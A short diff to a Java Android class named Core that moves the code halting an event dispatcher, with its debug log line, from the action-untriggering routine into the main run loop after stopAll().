@@ -200,6 +200,14 @@ public class Core extends Activity implements Runnable {
 			}
 
 			stopAll();
+			
+			final EvDispatcher logDispatcher = EvDispatcher.self();
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopAll), stopping EvDispatcher");
+			}
+			logDispatcher.halt();
+			
 		} catch (final Throwable ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
@@ -333,14 +341,7 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
 		}
 
-		status.unTriggerAll();
-
-		final EvDispatcher logDispatcher = EvDispatcher.self();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (stopAll), stopping EvDispatcher");
-		}
-		logDispatcher.halt();
+		status.unTriggerAll();	
 
 	}
 
